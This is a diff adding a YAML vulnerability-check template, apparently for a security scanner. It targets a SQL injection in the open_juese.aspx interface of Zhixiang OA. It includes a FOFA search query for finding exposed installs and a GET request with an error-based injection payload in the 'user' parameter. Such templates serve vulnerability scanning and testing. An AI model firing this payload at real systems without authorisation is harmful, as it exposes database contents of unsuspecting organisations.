@@ -1,0 +1,25 @@
+id: zhixiang-oa-open-juese-sqli
+
+info:
+  name: 致翔 OA 系统接口 open_juese 存在 SQL 注入漏洞
+  author: zan8in
+  severity: high
+  verified: false
+  description: |
+    致翔OA open_juese存在SQL注入漏洞，未经授权的攻击者可通过该漏洞获取数据库敏感信息。
+    fofa: app="致翔软件-致翔OA"
+  reference:
+    - https://wiki.wy876.cn/#/./%E8%87%B4%E7%BF%94OA/%E8%87%B4%E7%BF%94OA%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3open_juese%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E
+  tags: zhixiang,oa,sqli
+  created: 2024/12/06
+
+set:
+  randstr: randomLowercase(28)
+  md5str: md5(randstr)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /OpenWindows/open_juese.aspx?key=1&name=1&user=-1)+and+1=user--+&requeststr=1
+    expression: response.status == 500 && response.body.bcontains(b'nvarchar') && response.body.bcontains(b'[SqlException]')
+expression: r0()
